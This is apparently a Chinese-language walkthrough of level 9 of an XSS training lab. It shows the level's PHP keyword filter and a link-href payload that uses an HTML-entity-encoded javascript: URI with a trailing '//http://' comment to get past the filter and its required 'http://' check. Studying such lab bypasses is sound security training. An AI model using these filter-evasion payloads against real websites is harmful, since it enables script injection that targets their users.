
和上关看起来差不多，又是友情链接点击事件
试试上关的payload:
```
java&#115;cript:alert(1)
```
失败

## 查看分析源码

```php
$str = strtolower($_GET["keyword"]);
$str2 = str_replace("script","scr_ipt",$str);    // 和第8关一样
$str3 = str_replace("on","o_n",$str2);
$str4 = str_replace("src","sr_c",$str3);
$str5 = str_replace("data","da_ta",$str4);
$str6 = str_replace("href","hr_ef",$str5);
$str7 = str_replace('"','&quot',$str6);

if(false===strpos($str7,'http://'))
{
  echo '<a href="您的链接不合法？有没有！">友情链接</a>';  // 没http://就不渲染a标签
}
else
{
  echo '<a href="'.$str7.'">友情链接</a>';
}
```

多了一步检查——链接里必须有 `http://`，不然只显示 "您的链接不合法？有没有！"

## 构造 payload

在第8关payload尾巴上加 `//http://`：

```
java&#115;cript:alert(1)//http://
```

![](99_Attachments/图片/level9/file-20260617194447290.png)
`//` 在 JS 里是单行注释，`http://` 全被注释掉不执行

拼进去：

```html
<a href="java&#115;cript:alert(1)//http://">友情链接</a>
```

一步搞定：既有 `http://` 过检测，HTML实体又绕了 `script` 过滤